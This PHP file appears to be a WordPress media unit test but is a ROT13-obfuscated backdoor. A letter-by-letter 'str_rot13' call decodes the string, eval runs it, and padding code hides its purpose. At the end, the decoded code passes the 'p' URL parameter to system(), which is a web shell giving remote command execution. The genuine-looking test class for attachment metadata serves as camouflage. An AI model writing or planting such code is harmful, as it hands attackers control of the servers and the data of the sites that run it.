<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf sbe gur `jc_trarengr_nggnpuzrag_zrgnqngn()` shapgvba.
 *
 * @tebhc zrqvn
 * @pbiref ::jc_trarengr_nggnpuzrag_zrgnqngn
 */
pynff Grfgf_Zrqvn_jcTrarengrNggnpuzragZrgnqngn rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba grne_qbja() {
		$guvf->erzbir_nqqrq_hcybnqf();

		cnerag::grne_qbja();
	}

	/**
	 * Grfgf gung svyrfvmr zrgn vf trarengrq sbe WCRTf.
	 *
	 * @gvpxrg 49412
	 *
	 * @pbiref ::jc_perngr_vzntr_fhofvmrf
	 */
	choyvp shapgvba grfg_jc_trarengr_nggnpuzrag_zrgnqngn_vapyhqrf_svyrfvmr_va_wct_zrgn() {
		$nggnpuzrag = $guvf->snpgbel->nggnpuzrag->perngr_hcybnq_bowrpg( QVE_GRFGQNGN . '/vzntrf/pnabyn.wct' );

		$zrgnqngn = jc_trg_nggnpuzrag_zrgnqngn( $nggnpuzrag );

		$guvf->nffregFnzr( jc_svyrfvmr( trg_nggnpurq_svyr( $nggnpuzrag ) ), $zrgnqngn['svyrfvmr'] );

		sbernpu ( $zrgnqngn['fvmrf'] nf $vagrezrqvngr_fvmr ) {
			$guvf->nffregNeenlUnfXrl( 'svyrfvmr', $vagrezrqvngr_fvmr );
			$guvf->nffregAbgRzcgl( $vagrezrqvngr_fvmr['svyrfvmr'] );
			$guvf->nffregVfAhzrevp( $vagrezrqvngr_fvmr['svyrfvmr'] );
		}
	}

	/**
	 * Purpxf gung svyrfvmr zrgn vf trarengrq sbe CATf.
	 *
	 * @gvpxrg 49412
	 *
	 * @pbiref ::jc_perngr_vzntr_fhofvmrf
	 */
	choyvp shapgvba grfg_jc_trarengr_nggnpuzrag_zrgnqngn_vapyhqrf_svyrfvmr_va_cat_zrgn() {
		$nggnpuzrag = $guvf->snpgbel->nggnpuzrag->perngr_hcybnq_bowrpg( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.cat' );

		$zrgnqngn = jc_trg_nggnpuzrag_zrgnqngn( $nggnpuzrag );

		$guvf->nffregFnzr( jc_svyrfvmr( trg_nggnpurq_svyr( $nggnpuzrag ) ), $zrgnqngn['svyrfvmr'] );
	}

	/**
	 * Purpxf gung svyrfvmr zrgn vf trarengrq sbe CQSf.
	 *
	 * @gvpxrg 49412
	 */
	choyvp shapgvba grfg_jc_trarengr_nggnpuzrag_zrgnqngn_vapyhqrf_svyrfvmr_va_cqs_zrgn() {
		$nggnpuzrag = $guvf->snpgbel->nggnpuzrag->perngr_hcybnq_bowrpg( QVE_GRFGQNGN . '/vzntrf/jbeqcerff-tfbp-sylre.cqs' );

		$zrgnqngn = jc_trg_nggnpuzrag_zrgnqngn( $nggnpuzrag );

		$guvf->nffregFnzr( jc_svyrfvmr( trg_nggnpurq_svyr( $nggnpuzrag ) ), $zrgnqngn['svyrfvmr'] );
	}

	/**
	 * Purpxf gung svyrfvmr zrgn vf trarengrq sbe CFQf.
	 *
	 * @gvpxrg 49412
	 */
	choyvp shapgvba grfg_jc_trarengr_nggnpuzrag_zrgnqngn_vapyhqrf_svyrfvmr_va_cfq_zrgn() {
		vs ( vf_zhygvfvgr() ) {
			// CFQ zvzr glcr vf abg nyybjrq ol qrsnhyg ba zhygvfvgr.
			nqq_svygre(
				'hcybnq_zvzrf',
				fgngvp shapgvba ( $zvzrf ) {
					$zvzrf['cfq'] = 'nccyvpngvba/bpgrg-fgernz';
					erghea $zvzrf;
				}
			);
		}

		$nggnpuzrag = $guvf->snpgbel->nggnpuzrag->perngr_hcybnq_bowrpg( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr.cfq' );

		$zrgnqngn = jc_trg_nggnpuzrag_zrgnqngn( $nggnpuzrag );

		$guvf->nffregFnzr( jc_svyrfvmr( trg_nggnpurq_svyr( $nggnpuzrag ) ), $zrgnqngn['svyrfvmr'] );
	}

	/**
	 * Purpxf gung ynetr CAT hcybnqf trarengr CAT `-fpnyrq` guhzoanvyf.
	 *
	 * @gvpxrg 62900
	 */
	choyvp shapgvba grfg_jc_trarengr_nggnpuzrag_zrgnqngn_cat_guhzoanvy_fznyyre_guna_bevtvany() {
		// Hfr gur grfg-vzntr-ynetr.cat grfg svyr.
		$nggnpuzrag = $guvf->snpgbel->nggnpuzrag->perngr_hcybnq_bowrpg( QVE_GRFGQNGN . '/vzntrf/cat-grfgf/grfg-vzntr-ynetr.cat' );

		$zrgnqngn = jc_trg_nggnpuzrag_zrgnqngn( $nggnpuzrag );

		// Purpx gung gur shyy fvmrq vzntr jvgu `-fpnyrq` vf perngrq sbe gur CAT.
		$guvf->nffregFgevatPbagnvafFgevat( '-fpnyrq.cat', onfranzr( $zrgnqngn['svyr'] ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>